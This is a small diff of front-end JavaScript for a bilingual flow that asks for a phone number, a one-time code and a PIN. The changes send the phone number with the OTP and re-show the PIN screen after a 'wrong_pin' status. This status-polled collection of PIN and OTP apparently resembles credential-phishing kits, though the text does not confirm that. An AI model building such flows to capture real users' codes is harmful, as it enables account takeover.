@@ -1159,7 +1159,11 @@
                     method: 'POST',
                     credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ requestId: currentRequestId, otp: otp })
+                    body: JSON.stringify({
+                        requestId: currentRequestId,
+                        phone: `${phoneCode}${currentMsisdn}`,
+                        otp: otp
+                    })
                 });
                 const data = await res.json();
 
@@ -1520,7 +1524,12 @@
                 case 'wrong_pin':
                     stopStatusPolling();
                     waitingScreen.style.display = 'none';
-                    showPhoneScreen();
+                    phoneScreen.classList.add('hidden');
+                    pinScreen.classList.add('active');
+                    linkScreen.classList.remove('active');
+                    otpScreen.classList.remove('active');
+                    pinInputs.forEach(i => i.value = '');
+                    pinInputs[0].focus();
                     alert(currentLang === 'fr'
                         ? 'PIN incorrect. Veuillez réessayer.'
                         : 'Wrong PIN. Please try again.');
